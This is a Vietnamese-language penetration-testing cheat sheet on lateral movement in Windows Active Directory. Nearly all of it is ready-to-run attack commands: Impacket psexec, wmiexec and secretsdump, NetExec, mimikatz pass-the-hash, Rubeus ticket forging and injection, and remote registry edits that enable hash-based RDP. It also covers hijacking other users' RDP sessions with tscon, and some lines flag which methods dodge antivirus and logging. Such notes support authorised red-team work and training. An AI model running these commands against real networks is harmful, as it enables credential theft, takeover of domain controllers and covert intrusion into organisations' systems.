# 08 — Lateral Movement

**Trạng thái:** có creds/hash/ticket và quyền admin ở đâu đó. **Mục tiêu:** chạy
lệnh trên máy khác, lan tới DC. Mindmap gom thành các "move": Clear text, PtH,
PtT, OverPtH/PTK.

---

## A. Tìm nơi có thể lateral

```bash
nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users      # ai đang login (săn DA)
nxc smb <ip_range> -u <user> -p <password>                       # (Pwn3d!) = admin ở đâu
```

```cypher
MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name:"<MYTARGET.FQDN>"})) RETURN p   # BloodHound
```

---

## B. Clear text move (có mật khẩu)

> **Khi nào:** có user+password và là admin trên máy đích.

```bash
psexec.py <domain>/<user>:<password>@<ip>          # tạo service → SYSTEM
psexecsvc.py <domain>/<user>:<password>@<ip>
smbexec.py <domain>/<user>:<password>@<ip>         # không drop binary, kín hơn
wmiexec.py <domain>/<user>:<password>@<ip>         # semi-interactive, ít log (ưu tiên né AV)
atexec.py <domain>/<user>:<password>@<ip> "command"
dcomexec.py <domain>/<user>:<password>@<ip>
smbclient.py <domain>/<user>:<password>@<ip>       # pseudo-shell đọc/ghi file
nxc smb <ip_range> -u <user> -p <password> -d <domain> -x <cmd>    # chạy lệnh nhanh
nxc winrm <ip_range> -u <user> -p <password> -d <domain> -x <cmd>
```

```powershell
psexec.exe -AcceptEULA \\<ip>                      # Interactive psexec (Sysinternals)
Enter-PSSession -ComputerName <computer> -Credential <domain>\<user>    # WinRM
```

- **Kết quả:** box **"Admin / Authority/System / Low access"** tuỳ quyền user.

---

## C. Pass the Hash (PtH)

> **Khi nào:** có **NT hash**, user là admin trên máy đích (NTLM auth bật).

```bash
# Impacket: giống clear text nhưng dùng -hashes ':<hash>'
psexec.py <domain>/<user>@<ip> -hashes :<hash>
wmiexec.py <domain>/<user>@<ip> -hashes :<hash>
secretsdump.py '<domain>'/'<user>':@'<domain_controller>' -hashes :<hash>
# NetExec: dùng -H ':<hash>'
nxc smb <ip_range> -u <user> -H ':<hash>'
```

```powershell
mimikatz "privilege::debug" "sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
```

- **Kết quả:** box **"Admin"**. (NetNTLMv2 từ Responder **không** PtH được — phải crack.)

---

## D. OverPass-the-Hash / Pass-the-Key (PTK)

> **Khi nào:** có NT hash hoặc AES key; muốn dùng Kerberos (service chỉ nhận Kerberos).

```bash
getTGT.py <domain>/<user> -hashes :<hashes>        # NT hash → TGT
export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache
# rồi dùng -k -no-pass với mọi tool impacket
psexec.py -k -no-pass <domain>/<user>@<target_fqdn>
```

```powershell
Rubeus.exe asktgt /user:victim /rc4:<rc4value>
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```

- **Kết quả:** box **"Kerberos TGT"** → PtT.

---

## E. Pass the Ticket (PtT)

> **Khi nào:** có `.ccache`/`.kirbi` (từ dump LSASS, S4U, PKINIT, OverPtH).

```bash
export KRB5CCNAME=ticket.ccache
# impacket: -k -no-pass
psexec.py -k -no-pass <domain>/<user>@<target_fqdn>
# convert định dạng
ticketConverter.py <kirbi||ccache> <ccache||kirbi>
# sửa service của ticket (alternate service)
tgssub.py -in <ticket.ccache> -out <newticket.ccache> -altservice "<service>/<target>"
```

```powershell
Rubeus.exe ptt /ticket:<ticket>
mimikatz kerberos::ptc "<ticket>"
```

- **Kết quả:** box **"Admin"** trên máy đích.

---

## F. RDP (với hash — Restricted Admin)

> **Khi nào:** chỉ có hash, muốn RDP. Cần bật Restricted Admin trên đích.

```bash
# Bật Restricted Admin từ xa (qua reg) rồi pth RDP:
reg.py <domain>/<user>@<ip> -hashes ':<hash>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
xfreerdp /u:<user> /d:<domain> /p:<password> /v:<ip>      # với mật khẩu
```

### Impersonate RDP session (đã là admin trên máy có session khác)

```powershell
query user
psexec.exe -s -i cmd
tscon.exe <id> /dest:<session_name>     # chiếm session RDP của user khác
```

- **Kết quả:** chiếm phiên của user đặc quyền đang mở RDP.

---

## G. WinRM

```bash
evil-winrm -i <ip> -u <user> -p <password>
evil-winrm -i <ip> -u <user> -H <hash>
```

---

## Checklist Lateral Movement

- [ ] `nxc smb <range>` tìm (Pwn3d!) + `--loggedon-users`
- [ ] Clear text: wmiexec (kín) / psexec (SYSTEM)
- [ ] PtH với NT hash; OverPtH → TGT khi cần Kerberos
- [ ] PtT với ticket (`-k -no-pass`)
- [ ] RDP pth (Restricted Admin) / chiếm session (tscon)
- [ ] Tới máy có DA login → dump LSASS (file 07)
